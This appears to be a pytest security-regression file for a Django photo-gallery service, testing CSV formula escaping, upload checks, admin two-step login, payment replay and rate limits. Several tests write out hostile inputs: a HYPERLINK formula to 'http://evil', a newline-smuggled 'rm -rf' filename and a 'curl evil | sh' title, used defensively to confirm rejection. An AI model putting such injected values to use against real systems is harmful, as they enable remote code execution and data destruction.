"""Security fixes from the hardening sprint."""

import pytest
from django.test import Client
from django_otp.oath import totp
from django_otp.plugins.otp_totp.models import TOTPDevice

from apps.accounts.models import User
from apps.core import tenancy
from apps.events.models import Event
from apps.photos.models import Photo

from .conftest import PASSWORD
from .test_clients import make_event, outbox, photo_ids, shared  # noqa: F401 - shared fixtures
from .test_uploads import fake_storage, start_upload, studio_a, upload_and_confirm  # noqa: F401

pytestmark = pytest.mark.django_db


def test_csv_export_neutralises_spreadsheet_formulas(api, shared):
    guest = shared["guest"]
    first = photo_ids(guest)[0]
    guest.json(
        "put", f"/api/v1/client/selections/{first}", {"note": '=HYPERLINK("http://evil","x")'}
    )
    with tenancy.bypass_rls():
        Photo.objects.filter(pk=first).update(relative_path="+cmd/@file.jpg")
    csv = api.get(f"/api/v1/events/{shared['event'].pk}/export?type=csv").content.decode(
        "utf-8-sig"
    )
    row = csv.splitlines()[1]
    assert "'=HYPERLINK" in row
    assert ",'+cmd," in row and ",'+cmd/@file.jpg," in row


def test_upload_that_is_not_webp_is_refused_and_deleted(api, studio_a, fake_storage):
    upload, registered = start_upload(api, studio_a["event"], ["a.jpg"])
    photo_id = registered.json()["files"][0]["id"]
    api.json("post", f"/api/v1/uploads/{upload}/urls", {"photo_ids": [photo_id]})
    with tenancy.bypass_rls():
        incoming = Photo.objects.get(pk=photo_id).incoming_key()
    fake_storage["objects"][incoming] = 5000
    fake_storage["objects"][f"{incoming}#head"] = b"<html><script>alert(1)"
    entry = {"id": photo_id, "width": 10, "height": 10, "source": "jpeg"}
    result = api.json("post", f"/api/v1/uploads/{upload}/confirm", {"photos": [entry]}).json()
    assert result["results"][0]["failure_reason"] == "Not a WebP image."
    assert fake_storage["deleted"] == [incoming]


class TestConfirmedEmailRequired:
    @pytest.fixture
    def unverified(self, api, monkeypatch):
        from apps.notifications import emails

        monkeypatch.setattr(emails, "_queue", lambda *a: None)
        api.json(
            "post",
            "/api/v1/auth/signup",
            {
                "studio_name": "New",
                "full_name": "Asha",
                "email": "a@example.com",
                "password": PASSWORD,
                "phone": "98765 43210",
                "pincode": "600028",
                "password_confirm": PASSWORD,
            },
        )
        user = User.objects.get(email="a@example.com")
        return make_event(user.studio, photos=1)

    def test_cannot_share_a_gallery(self, api, unverified):
        response = api.json(
            "post",
            f"/api/v1/events/{unverified.pk}/clients",
            {"client_name": "C", "email": "c@x.com"},
        )
        assert response.status_code == 403
        assert "Confirm your email" in response.json()["detail"]

    def test_cannot_invite_staff(self, api, unverified):
        assert (
            api.json("post", "/api/v1/staff", {"full_name": "S", "email": "s@x.com"}).status_code
            == 403
        )


class TestAdminTwoStepLogin:
    @pytest.fixture
    def admin_user(self, make_studio):
        studio, _ = make_studio("alpha")
        with tenancy.bypass_rls():
            Event.objects.create(studio=studio, title="Alpha wedding")
        user = User.objects.create_superuser(
            email="admin@platform.test", password=PASSWORD, full_name="Admin"
        )
        device = TOTPDevice.objects.create(user=user, name="app", confirmed=True)
        return user, device

    def login(self, client, user, device, token):
        return client.post(
            "/admin/login/?next=/admin/",
            {
                "username": user.email,
                "password": PASSWORD,
                "otp_device": device.persistent_id,
                "otp_token": token,
            },
        )

    def test_password_alone_does_not_open_the_admin(self, admin_user):
        user, device = admin_user
        client = Client()
        self.login(client, user, device, "000000")
        assert client.get("/admin/events/event/").status_code == 302  # back to the login page

    def test_password_and_code_open_the_admin_across_studios(self, admin_user):
        user, device = admin_user
        client = Client()
        response = self.login(client, user, device, f"{totp(device.bin_key):06d}")
        assert response.status_code == 302 and response["Location"] == "/admin/"
        page = client.get("/admin/events/event/")
        assert page.status_code == 200
        assert "Alpha wedding" in page.content.decode()

    def test_one_device_needs_no_choosing(self, admin_user):
        user, device = admin_user
        client = Client()
        response = client.post(
            "/admin/login/?next=/admin/",
            {
                "username": user.email,
                "password": PASSWORD,
                "otp_token": f"{totp(device.bin_key):06d}",
            },
        )
        assert response.status_code == 302 and response["Location"] == "/admin/"

    def test_a_wrong_code_without_a_device_is_still_refused(self, admin_user):
        user, _ = admin_user
        client = Client()
        response = client.post(
            "/admin/login/?next=/admin/",
            {"username": user.email, "password": PASSWORD, "otp_token": "000000"},
        )
        assert response.status_code == 200
        assert client.get("/admin/events/event/").status_code == 302


def test_security_headers(client, db):
    page = client.get("/some/screen")
    policy = page.get("Content-Security-Policy-Report-Only", "")
    assert "frame-ancestors 'none'" in policy and "object-src 'none'" in policy
    api = client.get("/api/health")
    assert api["Permissions-Policy"].startswith("camera=()")
    assert api["X-Content-Type-Options"] == "nosniff"


class TestQueryCounts:
    """Paging through a big event must cost the same number of queries for 10 or 200 photos."""

    def fill(self, studio, event, n):
        with tenancy.bypass_rls():
            Photo.objects.bulk_create(
                Photo(
                    studio=studio,
                    event=event,
                    relative_path=f"bulk/{i:05}.jpg",
                    original_filename=f"{i:05}.jpg",
                    status=Photo.Status.READY,
                    preview_key=f"k/{i}/p",
                    thumb_key=f"k/{i}/t",
                    sort_order=100 + i,
                )
                for i in range(n)
            )

    def queries(self, client, path) -> int:
        from django.db import connection
        from django.test.utils import CaptureQueriesContext

        client.get("/api/v1/auth/csrf")
        with CaptureQueriesContext(connection) as ctx:
            assert client.get(path).status_code == 200
        return len(ctx.captured_queries)

    def test_studio_photo_list(self, api, shared):
        self.fill(shared["studio"], shared["event"], 200)
        base = f"/api/v1/events/{shared['event'].pk}/photos?page_size="
        assert self.queries(api, base + "10") == self.queries(api, base + "200")

    def test_client_gallery_and_selection_review(self, api, shared):
        self.fill(shared["studio"], shared["event"], 200)
        guest = shared["guest"]
        few = self.queries(guest, "/api/v1/client/photos?page_size=10")
        for photo in photo_ids(guest, page_size=50):
            guest.json("put", f"/api/v1/client/selections/{photo}")
        assert self.queries(guest, "/api/v1/client/photos?page_size=200") == few
        selection = f"/api/v1/events/{shared['event'].pk}/selection"
        assert self.queries(api, selection) <= 12  # constant: one query for all selected photos


class TestReviewFindings:
    """Fixes for the independent security review of the hardening sprint."""

    def test_payment_confirmation_cannot_be_replayed(self, api, make_studio, settings, monkeypatch):
        import hashlib
        import hmac as hmac_mod

        from apps.billing import razorpay
        from apps.billing.models import Plan, Subscription

        settings.RAZORPAY_KEY_ID, settings.RAZORPAY_KEY_SECRET = "rzp_test", "secret"
        studio, owner = make_studio("payer")
        with tenancy.bypass_rls():
            Plan.objects.filter(code="studio").update(razorpay_plan_id="plan_s")
            Subscription.objects.filter(studio=studio).update(status="trialing", plan=None)
        monkeypatch.setattr(
            razorpay, "create_subscription", lambda *a, **k: {"id": "sub_1", "status": "created"}
        )
        remote = {"status": "active", "current_end": 1893456000}
        monkeypatch.setattr(razorpay, "fetch_subscription", lambda sid: remote)
        api.json("post", "/api/v1/auth/login", {"email": owner.email, "password": PASSWORD})
        api.json("post", "/api/v1/billing/subscribe", {"plan": "studio"})
        sig = hmac_mod.new(b"secret", b"pay_1|sub_1", hashlib.sha256).hexdigest()
        body = {
            "razorpay_payment_id": "pay_1",
            "razorpay_subscription_id": "sub_1",
            "razorpay_signature": sig,
        }
        assert api.json("post", "/api/v1/billing/verify", body).status_code == 200

        # Later the plan is cancelled; replaying the old confirmation must not revive it.
        with tenancy.bypass_rls():
            Subscription.objects.filter(studio=studio).update(status="cancelled")
        assert api.json("post", "/api/v1/billing/verify", body).status_code == 400
        with tenancy.bypass_rls():
            assert Subscription.objects.get(studio=studio).status == "cancelled"

    def test_razorpay_must_report_the_subscription_active(
        self, api, make_studio, settings, monkeypatch
    ):
        import hashlib
        import hmac as hmac_mod

        from apps.billing import razorpay
        from apps.billing.models import Plan, Subscription

        settings.RAZORPAY_KEY_ID, settings.RAZORPAY_KEY_SECRET = "rzp_test", "secret"
        studio, owner = make_studio("payer")
        with tenancy.bypass_rls():
            plan = Plan.objects.get(code="studio")
            Subscription.objects.filter(studio=studio).update(
                status="trialing", plan=None, pending_plan=plan, razorpay_subscription_id="sub_1"
            )
        monkeypatch.setattr(razorpay, "fetch_subscription", lambda sid: {"status": "halted"})
        api.json("post", "/api/v1/auth/login", {"email": owner.email, "password": PASSWORD})
        sig = hmac_mod.new(b"secret", b"pay_1|sub_1", hashlib.sha256).hexdigest()
        body = {
            "razorpay_payment_id": "pay_1",
            "razorpay_subscription_id": "sub_1",
            "razorpay_signature": sig,
        }
        assert api.json("post", "/api/v1/billing/verify", body).status_code == 400

    def test_active_plan_lapses_after_its_period_and_grace(self):
        from datetime import timedelta

        from django.utils import timezone

        from apps.billing.models import Subscription

        now = timezone.now()
        sub = Subscription(status="active", current_period_end=now - timedelta(days=8))
        assert sub.access(now).state == "lapsed"
        sub.current_period_end = now - timedelta(days=2)
        assert sub.access(now).state == "active"

    def test_reusing_an_upload_link_after_confirming_changes_nothing(
        self, api, studio_a, fake_storage
    ):
        upload, registered = start_upload(api, studio_a["event"], ["a.jpg"])
        photo_id = registered.json()["files"][0]["id"]
        upload_and_confirm(api, fake_storage, upload, [photo_id], size=30_000)
        with tenancy.bypass_rls():
            photo = Photo.objects.get(pk=photo_id)
        assert fake_storage["objects"][photo.preview_key] == 30_000
        # The browser's links pointed at one-time incoming keys, never at the final ones.
        assert "incoming/" not in photo.preview_key and photo.upload_nonce == ""
        assert (
            api.json("post", f"/api/v1/uploads/{upload}/urls", {"photo_ids": [photo_id]}).json()[
                "urls"
            ]
            == []
        )

    def test_password_reset_ends_open_client_sessions(self, api, shared):
        guest = shared["guest"]
        assert guest.json("get", "/api/v1/client/me").status_code == 200
        api.json("post", f"/api/v1/client-access/{shared['creds']['id']}/reset-password")
        assert guest.json("get", "/api/v1/client/me").status_code == 403

    def test_ip_limit_counts_across_accounts_and_ignores_forged_addresses(self, make_studio):
        make_studio("alpha")
        codes = []
        for i in range(31):
            # The proxy appends the real address last; whatever the client put first is ignored.
            client = Client(HTTP_X_FORWARDED_FOR=f"10.0.0.{i}, 203.0.113.7")
            response = client.post(
                "/api/v1/auth/login",
                {"email": f"user{i}@example.com", "password": "wrong-pass"},
                content_type="application/json",
            )
            codes.append(response.status_code)
        assert codes[:30] == [400] * 30
        assert codes[30] == 429

    def test_unsafe_names_are_refused(self, api, studio_a):
        _, registered = start_upload(api, studio_a["event"], ["Day 1/a|b.jpg"])
        assert registered.status_code == 400
        _, newline = start_upload(api, studio_a["event"], ["Day 1/a\nrm -rf.jpg"])
        assert newline.status_code == 400
        title = api.json(
            "patch", f"/api/v1/events/{studio_a['event'].pk}", {"title": "Wedding\ncurl evil | sh"}
        )
        assert title.status_code == 400

    def test_closed_upload_sessions_take_no_more_files(self, api, studio_a):
        upload, _ = start_upload(api, studio_a["event"], ["a.jpg"])
        api.json("post", f"/api/v1/uploads/{upload}/complete")
        again = api.json(
            "post", f"/api/v1/uploads/{upload}/files", {"files": [{"relative_path": "b.jpg"}]}
        )
        assert again.status_code == 400

    def test_bad_album_filter_is_a_400_not_a_crash(self, api, studio_a):
        response = api.json("get", f"/api/v1/events/{studio_a['event'].pk}/photos?album=not-a-uuid")
        assert response.status_code == 400

    def test_production_refuses_to_start_without_a_secret_key(self):
        import os
        import subprocess
        import sys

        env = {k: v for k, v in os.environ.items() if k != "DJANGO_SECRET_KEY"} | {
            "DJANGO_DEBUG": "false"
        }
        result = subprocess.run(
            [sys.executable, "-c", "import config.settings"],
            env=env,
            capture_output=True,
            text=True,
        )
        assert result.returncode != 0 and "DJANGO_SECRET_KEY" in result.stderr
